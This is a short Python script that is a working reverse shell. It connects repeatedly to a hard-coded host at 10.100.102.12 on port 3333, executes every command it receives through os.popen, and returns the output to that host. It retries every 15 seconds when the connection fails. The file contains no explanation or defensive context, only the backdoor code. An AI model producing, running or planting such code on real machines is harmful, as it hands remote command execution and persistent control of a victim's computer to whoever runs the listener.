from socket import *
import os
import time


while True:
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(("10.100.102.12",3333))

        while True:
            data = client.recv(2048).decode()

            if data == "exit":
                client.close()
                break

            result = os.popen(data).read()
            client.sendall(result.encode())
    except:
        print ("Error")
        time.sleep(15)
        continue
